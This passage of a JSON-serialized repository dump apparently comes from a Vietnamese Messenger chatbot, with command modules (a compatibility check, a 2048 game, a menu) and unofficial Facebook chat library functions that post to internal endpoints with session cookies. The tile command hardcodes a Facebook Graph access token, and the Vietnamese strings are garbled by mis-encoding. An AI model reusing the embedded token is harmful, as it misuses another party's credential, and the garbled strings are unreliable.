api.sendMessage(\"‚ùå C√≥ l·ªói x·∫£y ra! Vui l√≤ng th·ª≠ l·∫°i sau.\", threadID, messageID);\n    }\n};","path":null,"size_bytes":23891,"size_tokens":null},"modules/commands/tile.js":{"content":"module.exports.config = {\n    name: \"tile\", //t·ªâ l·ªá h·ª£p nhau\n    version: \"1.0.1\",\n    hasPermssion: 0,\n    credits: \"Team Mirai\",\n    description: \"Xem t·ªâ l·ªá h·ª£p ƒë√¥i gi·ªØa 2 ng∆∞·ªùi\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"[tag]\",\n    cooldowns: 10,\n    dependencies: {\n        \"fs-extra\": \"\",\n        \"axios\": \"\"\n    }\n}\n\nmodule.exports.run = async function({ api, args, Users, event}) {\n    const axios = global.nodemodule[\"axios\"];\nconst request = global.nodemodule[\"request\"];\nconst fs = global.nodemodule[\"fs-extra\"];\n    var mention = Object.keys(event.mentions)[0];\n    if(!mention) return api.sendMessage(\"C·∫ßn ph·∫£i tag 1 ng∆∞·ªùi b·∫°n mu·ªën xem t·ªâ l·ªá h·ª£p nhau\", event.threadID);\n    var name = (await Users.getData(mention)).name\n    var namee = (await Users.getData(event.senderID)).name\n    var tle = Math.floor(Math.random() * 101);\n\n    var arraytag = [];\n        arraytag.push({id: mention, tag: name});\n        arraytag.push({id: event.senderID, tag: namee});\n    var mentions = Object.keys(event.mentions)\n\n        let Avatar = (await axios.get( `https://graph.facebook.com/${mentions}/picture?width=512&height=512&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`, { responseType: \"arraybuffer\" } )).data; \n            fs.writeFileSync( __dirname + \"/cache/avt.png\", Buffer.from(Avatar, \"utf-8\") );\n        let Avatar2 = (await axios.get( `https://graph.facebook.com/${event.senderID}/picture?width=512&height=512&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`, { responseType: \"arraybuffer\" } )).data;\n            fs.writeFileSync( __dirname + \"/cache/avt2.png\", Buffer.from(Avatar2, \"utf-8\") );        \n\n\n       var imglove = [];\n              \n              imglove.push(fs.createReadStream(__dirname + \"/cache/avt2.png\"));\n              imglove.push(fs.createReadStream(__dirname + \"/cache/avt.png\"));\n        var msg = {body: `üíï T·ªâ l·ªá h·ª£p ƒë√¥i gi·ªØa ${namee} v√† ${name} l√† ${tle}% ü•∞`, mentions: arraytag, attachment: imglove}\n        return api.sendMessage(msg, event.threadID, event.messageID)\n}","path":null,"size_bytes":2095,"size_tokens":null},"lib/fca-auto/src/forwardAttachment.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function forwardAttachment(attachmentID, userOrUsers, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    var form = {\n      attachment_id: attachmentID\n    };\n\n    if (utils.getType(userOrUsers) !== \"Array\") userOrUsers = [userOrUsers];\n\n    var timestamp = Math.floor(Date.now() / 1000);\n\n    //That's good, the key of the array is really timestmap in seconds + index\n    //Probably time when the attachment will be sent?\n    for (var i = 0; i < userOrUsers.length; i++) form[\"recipient_map[\" + (timestamp + i) + \"]\"] = userOrUsers[i];\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/mercury/attachments/forward/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx.jar, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"forwardAttachment\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1408,"size_tokens":null},"lib/fca-auto/src/changeAdminStatus.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  return function changeAdminStatus(threadID, adminIDs, adminStatus, callback) {\n    if (utils.getType(threadID) !== \"String\") {\n      throw {error: \"changeAdminStatus: threadID must be a string\"};\n    }\n\n    if (utils.getType(adminIDs) === \"String\") {\n      adminIDs = [adminIDs];\n    }\n\n    if (utils.getType(adminIDs) !== \"Array\") {\n      throw {error: \"changeAdminStatus: adminIDs must be an array or string\"};\n    }\n\n    if (utils.getType(adminStatus) !== \"Boolean\") {\n      throw {error: \"changeAdminStatus: adminStatus must be a string\"};\n    }\n\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc();\n      };\n    }\n\n    if (utils.getType(callback) !== \"Function\" && utils.getType(callback) !== \"AsyncFunction\") {\n      throw {error: \"changeAdminStatus: callback is not a function\"};\n    }\n\n    let form = {\n      \"thread_fbid\": threadID,\n    };\n\n    let i = 0;\n    for (let u of adminIDs) {\n      form[`admin_ids[${i++}]`] = u;\n    }\n    form[\"add\"] = adminStatus;\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/save_admins/?dpr=1\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function(resData) {\n        if (resData.error) {\n          switch (resData.error) {\n            case 1976004:\n              throw { error: \"Cannot alter admin status: you are not an admin.\", rawResponse: resData };\n            case 1357031:\n              throw { error: \"Cannot alter admin status: this thread is not a group chat.\", rawResponse: resData };\n            default:\n              throw { error: \"Cannot alter admin status: unknown error.\", rawResponse: resData };\n          }\n        }\n\n        callback();\n      })\n      .catch(function(err) {\n        log.error(\"changeAdminStatus\", err);\n        return callback(err);\n      });\n      \n    return returnPromise;\n  };\n};\n\n","path":null,"size_bytes":2249,"size_tokens":null},"lib/fca-auto/Extra/Src/uuid.js":{"content":"/**\n * Credit: @chronosis | Github: https://github.com/chronosis/uuid-apikey/\n * Description: Update  Package to resolve Deprecated from package \"uuid\"\n*/\n// index.js\n\n// Dependencies\nconst base32 = require('encode32');\nconst uuidv4 = require('uuid').v4;\n\n// APIKeys are a Base32-Crockford encoded representation of UUIDs\n// Base32-Crockford encoding is used to maintain human readability of the values\n// and to eliminate confusing overlapping characters (0 -> O; l -> 1; etc.)\nclass UUIDAPIKey {\n  constructor() {\n    this.defaultOptions = { noDashes: false };\n  }\n\n  checkDashes(positions, str) {\n    let test = true;\n    for (const pos in positions) {\n      if (positions.hasOwnProperty(pos)) {\n        const chr = str.charAt(positions[pos]);\n        test = test && chr === '-';\n      }\n    }\n    return test;\n  }\n\n  isUUID(uuid) {\n    if (!uuid) {\n      throw new ReferenceError('The required parameter \\'uuid\\' is undefined.');\n    }\n    const uuidCheck = this.checkDashes([8, 13, 18], uuid);\n    // Only check the first three dashes as ColdFusion implementations erroneously omit the last dash\n    uuid = uuid.replace(/-/g, '');\n    const re = /[0-9A-Fa-f]*/g;\n    return uuidCheck && uuid.length === 32 && re.test(uuid);\n  }\n\n  isAPIKey(apiKey) {\n    if (!apiKey) {\n      throw new ReferenceError('The required parameter \\'apiKey\\' is undefined.');\n    }\n    apiKey = apiKey.toUpperCase().replace(/-/g, '');\n    const re = /[0-9A-Z]*/g;\n    return apiKey.length === 28 && re.test(apiKey);\n  }\n\n  toAPIKey(uuid, options) {\n    if (!uuid) {\n      throw new ReferenceError('The required parameter \\'uuid\\' is undefined.');\n    }\n    options = options || this.defaultOptions;\n    if (this.isUUID(uuid)) {\n      uuid = uuid.replace(/-/g, '');\n      const s1 = uuid.substr(0, 8);\n      const s2 = uuid.substr(8, 8);\n      const s3 = uuid.substr(16, 8);\n      const s4 = uuid.substr(24, 8);\n      const n1 = Number(`0x${s1}`);\n      const n2 = Number(`0x${s2}`);\n      const n3 = Number(`0x${s3}`);\n      const n4 = Number(`0x${s4}`);\n      const e1 = base32.encode32(n1);\n      const e2 = base32.encode32(n2);\n      const e3 = base32.encode32(n3);\n      const e4 = base32.encode32(n4);\n      if (options.noDashes) {\n        return `${e1}${e2}${e3}${e4}`;\n      }\n      return `${e1}-${e2}-${e3}-${e4}`;\n    }\n    throw new TypeError(`The value provide '${uuid}' is not a valid uuid.`);\n  }\n\n  toUUID(apiKey) {\n    if (!apiKey) {\n      throw new ReferenceError('The required parameter \\'apiKey\\' is undefined.');\n    }\n    if (this.isAPIKey(apiKey)) {\n      apiKey = apiKey.replace(/-/g, '');\n      const e1 = apiKey.substr(0, 7);\n      const e2 = apiKey.substr(7, 7);\n      const e3 = apiKey.substr(14, 7);\n      const e4 = apiKey.substr(21, 7);\n      const n1 = base32.decode32(e1);\n      const n2 = base32.decode32(e2);\n      const n3 = base32.decode32(e3);\n      const n4 = base32.decode32(e4);\n      const s1 = n1.toString(16).padStart(8, '0');\n      const s2 = n2.toString(16).padStart(8, '0');\n      const s3 = n3.toString(16).padStart(8, '0');\n      const s4 = n4.toString(16).padStart(8, '0');\n      const s2a = s2.substr(0, 4);\n      const s2b = s2.substr(4, 4);\n      const s3a = s3.substr(0, 4);\n      const s3b = s3.substr(4, 4);\n      return `${s1}-${s2a}-${s2b}-${s3a}-${s3b}${s4}`;\n    }\n    throw new TypeError(`The value provide '${apiKey}' is not a valid apiKey.`);\n  }\n\n  check(apiKey, uuid) {\n    if (!apiKey) {\n      throw new ReferenceError('The required parameter \\'apiKey\\' is undefined.');\n    }\n    if (!uuid) {\n      throw new ReferenceError('The required parameter \\'uuid\\' is undefined.');\n    }\n    const apiTest = this.isAPIKey(apiKey.toUpperCase());\n    const uuidTest = this.isUUID(uuid);\n    let uuidCheck;\n    if (apiTest && uuidTest) {\n      uuidCheck = this.toUUID(apiKey);\n      return uuid === uuidCheck;\n    }\n    let errMsg = '';\n    if (!apiTest) {\n      errMsg += `The value provide '${apiKey}' is not a valid apiKey. `;\n    }\n    if (!uuidTest) {\n      errMsg += `The value provide '${uuid}' is not a valid uuid. `;\n    }\n    throw new TypeError(errMsg);\n  }\n\n  create(options) {\n    options = options || this.defaultOptions;\n    const uid = uuidv4();\n    // Generate a new UUIDv4\n    const apiKey = this.toAPIKey(uid, options);\n    return { apiKey: apiKey, uuid: uid };\n  }\n}\n\nmodule.exports = new UUIDAPIKey();\n","path":null,"size_bytes":4359,"size_tokens":null},"modules/commands/2048.js":{"content":"module.exports.config = {\n    name: \"2048\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"Khoa x Nam\",\n    description: \"2048\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"\",\n    cooldowns: 0\n  };\n  \n  const fs = require(\"fs-extra\");\n  const dirpath = __dirname + `/game2048/`;\n  const { loadImage, createCanvas } = require(\"canvas\");\n  let __2048 = '2,4,8,16,32,64,128,256,512,1024,2048'.split(',');\n  let all_√¥ = {};\n  \n  function findMax(map) {\n    let mergedMap = [].concat(...map), max = mergedMap[0];\n    for (let i = 1; i < mergedMap.length; i++) {\n      if (mergedMap[i]> max) max = mergedMap[i];\n    }\n    return max;\n  }\n  \n  function isGameOver(map) {\n    let mergedMap = [].concat(...map);\n    if (mergedMap.includes(0)) return false;\n    for (let i = 0; i < 4; i++) {\n      for (let j = 0; j < 4; j++) {\n        if (i !== 4 - 1 && map[i][j] === map[i + 1][j]) return false;\n        if (j !== 4 - 1 && map[i][j] === map[i][j + 1]) return false;\n      }\n    }\n    return true;\n  }\n  \n  async function draw(map,id) {\n    const canvas = createCanvas(2500, 1500);\n    const ctx = canvas.getContext('2d');\n    let name = global.data.userName.get(id) || \"getName error!\";\n    let score = [].concat(...map).reduce((a,b)=>a+b)\n    let max = findMax(map);\n    let background = await loadImage(\"https://raw.githubusercontent.com/KhoaDo472005/2048/main/board.png\");\n    ctx.drawImage(background, 0, 0, 2500, 1500);\n    ctx.font = '82px Arial';\n    ctx.textAlign = 'center';\n    ctx.fillStyle = 'white';\n    ctx.shadowColor = \"#000000\";\n    ctx.shadowBlur = 5;\n    ctx.shadowOffstX = 5;\n    ctx.shadowOffstY = 5;\n    ctx.fillText(name, 320, 130, 600);\n    ctx.font = '75px Arial';\n    ctx.textAlign = 'left';\n    ctx.fillText(\"\"+score, 2250, 110, 300);\n    ctx.fillText(\"\"+max, 2250, 210, 300);\n    ctx.textAlign = 'center';\n    ctx.font = '70px Arial';\n    ctx.fillStyle = '#c2ff61';\n    ctx.fillText(id, 320, 220, 600);\n    for (let i = 0; i < 4; i++) {\n      for (let j = 0; j < 4; j++) {\n        if (map[i][j]==0) continue;\n        let number = all_√¥[map[i][j]];\n        ctx.drawImage(number, 680+300*j, 205+300*i, 240, 240);\n      }\n    }\n    let path = dirpath + id + \".png\";\n    fs.writeFileSync(path, canvas.toBuffer(\"image/png\"));\n    return path;\n  }\n  \n  function delData(id) {\n    if (fs.existsSync(dirpath + id + \".json\")) fs.unlinkSync(dirpath + id + \".json\");\n    if (fs.existsSync(dirpath + id + \".png\")) fs.unlinkSync(dirpath + id + \".png\");\n    return;\n  }\n  \n  function createMap() {\n    let map = [\n      [0, 0, 0, 0],\n      [0, 0, 0, 0],\n      [0, 0, 0, 0],\n      [0, 0, 0, 0]\n    ];\n    const numberOfNumbers = Math.random() < 0.8 ? 2 : 3;\n    for (let i = 0; i < numberOfNumbers; i++) {\n      const row = Math.floor(Math.random() * 4);\n      const col = Math.floor(Math.random() * 4);\n      if (map[row][col] === 0) {\n        map[row][col] = Math.random() < 0.8 ? 2 : 4;\n      } else { i--; }\n    }\n    return map;\n  }\n  \n  function move(currentMap, direction) {\n    let map = [...currentMap];\n    function moveLine(line) {\n      let movedLine = line.filter(cell => cell !== 0);\n      let emptyCells = line.length - movedLine.length;\n      if (direction === 'd' || direction === 'r') movedLine.reverse();\n      for (let i = 0; i < movedLine.length - 1; i++) {\n        if (movedLine[i] === movedLine[i + 1]) {\n          movedLine[i] = movedLine[i] * 2;\n          movedLine[i + 1] = 0;\n          emptyCells++;\n        }\n      }\n      if (direction === 'd' || direction === 'r') movedLine.reverse();\n      movedLine = movedLine.filter(cell => cell !== 0);\n      let newLine = ['u','l'].includes(direction) ? movedLine.concat(Array(emptyCells).fill(0)): Array(emptyCells).fill(0).concat(movedLine);\n      return newLine;\n    }\n    function moveMap(direction) {\n      let newMap = [];\n      if (direction === 'u' || direction === 'd') {\n        for (let col = 0; col < map[0].length; col++) {\n          let line = [];\n          for (let row = 0; row < map.length; row++) {\n            line.push(map[row][col]);\n          }\n          line = moveLine(line);\n          for (let row = 0; row < map.length; row++) {\n            newMap[row] = newMap[row] || [];\n            newMap[row][col] = line[row];\n          }\n        }\n      } else if (direction === 'l' || direction === 'r') {\n        for (let row = 0; row < map.length; row++) {\n          newMap[row] = moveLine(map[row]);\n        }\n      }\n      return newMap;\n    }\n    return moveMap(direction);\n  }\n  \n  module.exports.onLoad = () => {\n    if (!fs.existsSync(dirpath)) fs.mkdirSync(dirpath);\n    Promise.all(__2048.map($=>loadImage(`https://raw.githubusercontent.com/KhoaDo472005/2048/main/no${$}.png`))).then(imgs=>imgs.map(($, i)=>all_√¥[__2048[i]] = $));\n  }\n  \n  module.exports.run = async function ({ api, event }) {\n    let { threadID, messageID, senderID } = event;\n    let choose = [\"1\", \"2\",\"3\"];\n    let text = \"Reply l·ª±a ch·ªçn!\\n1. Ch∆°i m·ªõi\\n2. H∆∞·ªõng d·∫´n\";\n    if (fs.existsSync(dirpath + senderID + \".json\")) { choose.push(\"3\"); text += \"\\n3. Ch∆°i ti·∫øp\" }\n    return api.sendMessage(text, threadID, (error, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        invalidC: choose,\n        type: \"procedure\"\n      })\n    }, messageID)\n  }\n  \n  module.exports.handleReply = async function ({ event, api, handleReply}) {\n    let {sendMessage: send, unsendMessage: unsend} = api;\n    let {threadID: tid, messageID: mid, senderID: sid, args} = event;\n    if (sid !== handleReply.author) return;\n    try {\n      if (handleReply.type == \"procedure\") {\n        if (!handleReply.invalidC.includes(event.body)) return send(\"‚ùå L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá!\", tid, mid);\n        if (event.body == \"1\") {\n          unsend(handleReply.messageID);\n          let map = createMap();\n          fs.writeFileSync(dirpath+`${sid}.json`, JSON.stringify(map, null, 2));\n          return send({body:\"Rep b·∫±ng k√≠ t·ª± ·ª©ng v·ªõi h∆∞·ªõng di chuy·ªÉn!\", attachment: fs.createReadStream(await draw(map, sid))}, tid, (error, info) => {\n            global.client.handleReply.push({\n              name: this.config.name,\n              messageID: info.messageID,\n              author: sid,\n              type: \"play\"\n            })\n          }, mid);\n        }\n        if (event.body == \"2\") return send(\n          \"B·∫°n c·∫ßn ph·∫£i s·ª≠ d·ª•ng c√°c k√≠ t·ª± U, D, L v√† R ƒë·ªÉ di chuy·ªÉn c√°c √¥ vu√¥ng trong b·∫£ng.\\n\"+\n          \"M·ª•c ti√™u c·ªßa tr√≤ ch∆°i l√† k·∫øt h·ª£p c√°c √¥ vu√¥ng c√≥ c√πng gi√° tr·ªã ƒë·ªÉ t·∫°o ra m·ªôt √¥ vu√¥ng c√≥ gi√° tr·ªã 2048\\n\"+\n          \"Khi b·∫£ng ƒë·∫ßy v√† kh√¥ng c√≥ hai √¥ li·ªÅn k·ªÅ n√†o b·∫±ng nhau, b·∫°n thua!\", tid, mid);\n        if (event.body == \"3\") {\n          try {\n            unsend(handleReply.messageID);\n            let map = JSON.parse(fs.readFileSync(dirpath+sid+\".json\"));\n            return send({body:\"Rep b·∫±ng k√≠ t·ª± ·ª©ng v·ªõi h∆∞·ªõng di chuy·ªÉn!\", attachment: fs.createReadStream(await draw(map, sid))}, tid, (error, info) => {\n              global.client.handleReply.push({\n                name: this.config.name,\n                messageID: info.messageID,\n                author: sid,\n                type: \"play\"\n              })\n            }, mid);\n          } catch (error) { return send(`‚ùå ƒê√£ x·∫£y ra l·ªói!\\n Vui l√≤ng th·ª≠ l·∫°i ho·∫∑c ch∆°i m·ªõi\\n Chi ti·∫øt l·ªói:\\n${error}`,tid,mid) }\n        }\n      }\n      if (handleReply.type == \"play\") {\n        let act = event.body.toLowerCase();\n        if (![\"u\",\"d\",\"l\",\"r\"].includes(act)) return send(\"L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá!\\nu: l√™n tr√™n\\nd: xu·ªëng d∆∞·ªõi\\nl: sang tr√°i\\nr: sang ph·∫£i\",tid,mid);\n        unsend(handleReply.messageID);\n        let map = JSON.parse(fs.readFileSync(dirpath+sid+\".json\"));\n        newMap = move(map, act);\n        if ([].concat(...newMap).includes(2048)) return send({body:\"üèÜ B·∫°n ƒë√£ th·∫Øng!\", attachment: fs.createReadStream(await draw(newMap, sid))}, tid, ()=> delData(sid), mid);\n        let text1 = [].concat(...map).join(\" \");\n        let text2 = [].concat(...newMap).join(\" \");\n        if (text1 !== text2) {\n          let check = 1;\n          while (check == 1) {\n            let r = Math.floor(Math.random() * 4);\n            let c = Math.floor(Math.random() * 4);\n            if (newMap[r][c] == 0) {\n              newMap[r][c] = Math.random() < 0.8 ? 2 : 4;\n              check++;\n            }\n          }\n        }\n        if (isGameOver(newMap)) return send({body:\"Tr√≤ ch∆°i k·∫øt th√∫c!\", attachment: fs.createReadStream(await draw(newMap, sid))}, tid, ()=> delData(sid), mid);\n        fs.writeFileSync(dirpath+`${sid}.json`, JSON.stringify(newMap, null, 2));\n        return send({body:\"Rep b·∫±ng k√≠ t·ª± ·ª©ng v·ªõi h∆∞·ªõng di chuy·ªÉn!\", attachment: fs.createReadStream(await draw(newMap, sid))}, tid, (error, info) => {\n          global.client.handleReply.push({\n            name: this.config.name,\n            messageID: info.messageID,\n            author: sid,\n            type: \"play\"\n          })\n        }, mid);\n      } \n    } catch(error) { return send(\"ƒê√£ x·∫£y ra l·ªói!\"+error, tid, mid); };\n  }","path":null,"size_bytes":9216,"size_tokens":null},"modules/commands/menu.js":{"content":"module.exports.config = {\n    name: 'menu',\n    version: '1.1.1',\n    hasPermssion: 0,\n    credits: 'DC-Nam mod by Vtuan',//Mod by TatsuYTB\n    description: 'Xem danh s√°ch nh√≥m l·ªánh, th√¥ng tin l·ªánh',\n    commandCategory: 'Danh s√°ch l·ªánh',\n    usages: '[...name commands|all|per <permission level>]',\n    cooldowns: 5,\n    envConfig: {\n        autoUnsend: {\n            status: true,\n            timeOut: 60 \n        },\n        sendAttachments: {\n            status: true,\n            random: true,\n            url: 'https://i.imgur.com/LKkw8SL.jpg'\n        }\n    }\n};\n\nconst {\n    autoUnsend = module.exports.config.envConfig.autoUnsend,\n    sendAttachments = module.exports.config.envConfig.sendAttachments\n} = global.config == undefined ? {} : global.config.menu == undefined ? {} : global.config.menu;\n\nconst { compareTwoStrings, findBestMatch } = require('string-similarity');\nconst { readFileSync, writeFileSync, existsSync } = require('fs-extra');\n\nmodule.exports.run = async function({ api, event, args }) {\n    const { sendMessage: send, unsendMessage: un } = api;\n    const { threadID: tid, messageID: mid, senderID: sid } = event;\n    const cmds = global.client.commands;\n    const isAdmin = global.config.ADMINBOT.includes(sid);\n\n    if (args.length >= 1) {\n        if (args[0] === 'per' && !isNaN(args[1])) {\n            const permissionLevel = parseInt(args[1]);\n            const filteredCmds = filterCommandsByPermission(cmds.values(), permissionLevel);\n            var txt = `Commands with permission level ${permissionLevel}\\n`,\n                count = 0;\n            for (const cmd of filteredCmds) {\n                txt += `${++count}. ${cmd.config.name} | ${cmd.config.description}\\n`;\n            }\n            const msg = sendAttachments.status ? { body: txt } : txt;\n            return send(msg, tid, (a, b) => autoUnsend.status ? setTimeout(v1 => un(v1), 1000 * autoUnsend.timeOut, b.messageID) : '');\n        }\n        \n        if (typeof cmds.get(args.join(' ')) == 'object') {\n            const body = infoCmds(cmds.get(args.join(' ')).config);\n            const msg = sendAttachments.status ? { body } : body;\n            return send(msg, tid, mid);\n        } else {\n            if (args[0] == 'all') {\n                const data = filterCommands(cmds.values(), isAdmin);\n                var txt = 'Menu all\\n',\n                count = 0;\n                for (const cmd of data) txt += `${++count}. ${cmd.config.name} | ${cmd.config.description}\\n`;\n                const msg = sendAttachments.status ? { body: txt } : txt;\n                send(msg, tid, (a, b) => autoUnsend.status ? setTimeout(v1 => un(v1), 1000 * autoUnsend.timeOut, b.messageID) : '');\n            } else {\n                const cmdsValue = filterCommands(cmds.values(), isAdmin);\n                const arrayCmds = [];\n                for (const cmd of cmdsValue) arrayCmds.push(cmd.config.name);\n                const similarly = findBestMatch(args.join(' '), arrayCmds);\n                if (similarly.bestMatch.rating >= 0.3) return send(` \"${args.join(' ')}\" l√† l·ªánh g·∫ßn gi·ªëng l√† \"${similarly.bestMatch.target}\" ?`, tid, mid);\n            };\n        };\n    } else {\n        const data = commandsGroup(isAdmin);\n        const totalCmds = data.reduce((acc, cur) => acc + cur.commandsName.length, 0); \n        var txt = '====== Menu ======\\n',\n        count = 0;\n        for (const { commandCategory, commandsName } of data) txt += `${++count}. ${commandCategory} || c√≥ ${commandsName.length} l·ªánh\\n`;\n        txt += `‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ\\n ${totalCmds} l·ªánh\\n‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚ïØ\\n‚ûú Reply t·ª´ 1 ƒë·∫øn ${data.length} ƒë·ªÉ ch·ªçn\\n‚ûú G·ª° t·ª± ƒë·ªông sau: 60s\\n‚ûúB·∫°n c√≥ th·ªÉ th·∫£ icon üòæ ƒë·ªÉ bot g·ª° tin nh·∫Øn\\n‚û© FB ADMIN: https://www.facebook.com/???`;\n        const msg = sendAttachments.status ? { body: txt } : txt;\n        send(msg, tid, (a, b) => {\n            global.client.handleReply.push({\n                name: module.exports.config.name,\n                messageID: b.messageID,\n                author: sid,\n                'case': 'infoGr',\n                data\n            });\n            if (autoUnsend.status) setTimeout(v1 => un(v1), 1000 * autoUnsend.timeOut, b.messageID);\n        });\n    };\n};\n\nmodule.exports.handleReply = async function({ handleReply: $, api, event }) {\n    const { sendMessage: send, unsendMessage: un } = api;\n    const { threadID: tid, messageID: mid, senderID: sid, args } = event;\n    const isAdmin = global.config.ADMINBOT.includes(sid);\n\n    if (sid != $.author) {\n        const msg = sendAttachments.status ? { body: `ƒêi ra ch·ªó kh√°c ch∆°i ü•π` } : `ƒêi ra ch·ªó kh√°c ch∆°i ü•π`;\n        return send(msg, tid, mid);\n    };\n    \n    switch ($.case) {\n        case 'infoGr': {\n            var data = $.data[(+args[0]) - 1];\n            if (data == undefined) {\n                const txt = `\"${args[0]}\" kh√¥ng n·∫±m trong s·ªë th·ª© t·ª± menu`;\n                const msg = sendAttachments.status ? { body: txt } : txt;\n                return send(msg, tid, mid);\n            };\n            un($.messageID);\n            var txt = '„Äé ' + data.commandCategory + ' „Äè\\n\\n',\n            count = 0;\n            for (const name of data.commandsName) txt += `${++count}. ${name}\\n`;\n            txt += `\\n\\n‚û© Reply t·ª´ 1 ƒë·∫øn ${data.commandsName.length} ƒë·ªÉ ch·ªçn\\n‚û© G·ª° t·ª± ƒë·ªông sau: 60s`;\n            const msg = sendAttachments.status ? { body: txt } : txt;\n            send(msg, tid, (a, b) => {\n                global.client.handleReply.push({\n                    name: module.exports.config.name,\n                    messageID: b.messageID,\n                    author: sid,\n                    'case': 'infoCmds',\n                    data: data.commandsName\n                });\n                if (autoUnsend.status) setTimeout(v1 => un(v1), 1000 * autoUnsend.timeOut, b.messageID);\n            });\n        };\n        break;\n        \n        case 'infoCmds': {\n            var data = global.client.commands.get($.data[(+args[0]) - 1]);\n            if (typeof data != 'object') {\n                const txt = `\"${args[0]}\" kh√¥ng n·∫±m trong s·ªë th·ª© t·ª± menu`;\n                const msg = sendAttachments.status ? { body: txt } : txt;\n                return send(msg, tid, mid);\n            };\n            const { config = {} } = data || {};\n            un($.messageID);\n            const msg = sendAttachments.status ? { body: infoCmds(config) } : infoCmds(config);\n            send(msg, tid, mid);\n        };\n        break;\n        \n        default:\n        // code\n    }\n};\n\nfunction filterCommands(commands, isAdmin) {\n    return Array.from(commands).filter(cmd => {\n        const { commandCategory, hasPermssion } = cmd.config;\n        if (isAdmin) return true;\n        return commandCategory !== 'H·ªá Th·ªëng' && hasPermssion < 2;\n    });\n}\n\nfunction filterCommandsByPermission(commands, permissionLevel) {\n    return Array.from(commands).filter(cmd => {\n        return cmd.config.hasPermssion === permissionLevel;\n    });\n}\n\nfunction commandsGroup(isAdmin) {\n    const array = [],\n    cmds = filterCommands(global.client.commands.values(), isAdmin);\n    for (const cmd of cmds) {\n        const { name, commandCategory } = cmd.config;\n        const find = array.find(i => i.commandCategory == commandCategory);\n        !find ? array.push({ commandCategory, commandsName: [name] }) : find.commandsName.push(name);\n    };\n    array.sort(sortCompare('commandsName'));\n    return array;\n}\n\nfunction infoCmds(a) {\n    return `${a.name}\\n\\n‚ûú Phi√™n b·∫£n : ${a.version}\\n‚ûú Quy·ªÅn h·∫°n : ${premssionTxt(a.hasPermssion)}\\n‚ûú T√°c gi·∫£ : ${a.credits}\\n‚ûú M√¥ t·∫£ : ${a.description}\\n‚ûú Thu·ªôc nh√≥m : ${a.commandCategory}\\n‚ûú C√°ch d√πng : ${a.usages}\\n‚ûú Th·ªùi gian ch·ªù : ${a.cooldowns} gi√¢y\\n`;\n}\n\nfunction premssionTxt(a) {\n    return a == 0 ? 'Th√†nh Vi√™n' : a == 1 ? 'Qu·∫£n Tr·ªã Vi√™n Nh√≥m' : a == 2 ? 'Ng∆∞·ªùi ƒêi·ªÅu H√†nh Bot' : 'ADMINBOT';\n}\n\nfunction prefix(a) {\n    const tidData = global.data.threadData.get(a) || {};\n    return tidData.PREFIX || global.config.PREFIX;\n}\n\nfunction sortCompare(k) {\n    return function(a, b) {\n        return (a[k].length > b[k].length ? 1 : a[k].length < b[k].length ? -1 : 0) * -1;\n    };\n}\n","path":null,"size_bytes":8264,"size_tokens":null},"lib/fca-auto/src/changeThreadEmoji.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeThreadEmoji(emoji, threadID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n    var form = {\n      emoji_choice: emoji,\n      thread_or_other_fbid: threadID\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/save_thread_emoji/?source=thread_settings&__pc=EXP1%3Amessengerdotcom_pkg\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error === 1357031) throw { error: \"Trying to change emoji of a chat that doesn't exist. Have at least one message in the thread before trying to change the emoji.\" };\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeThreadEmoji\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1288,"size_tokens":null},"modules/commands/factcat.js":{"content":"const axios = require(\"axios\");\n\nmodule.exports.config = {\n    name: \"factcat\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"G·ª≠i m·ªôt fact ng·∫´u nhi√™n v·ªÅ m√®o v√† d·ªãch sang ti·∫øng Vi·ªát\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"!catfact\",\n    cooldowns: 5,\n};\n\n// H√†m d·ªãch vƒÉn 